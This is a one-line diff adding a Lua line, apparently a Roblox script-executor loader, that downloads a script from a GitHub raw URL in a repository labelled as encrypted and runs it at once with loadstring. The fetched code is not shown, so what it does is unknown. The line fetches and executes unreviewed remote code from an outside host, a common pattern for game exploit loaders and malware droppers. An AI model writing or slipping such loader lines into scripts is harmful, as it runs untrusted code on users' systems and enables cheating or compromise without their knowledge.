@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AokiQM/BFH-Encrypted-test/master/layer_4.lua"))()
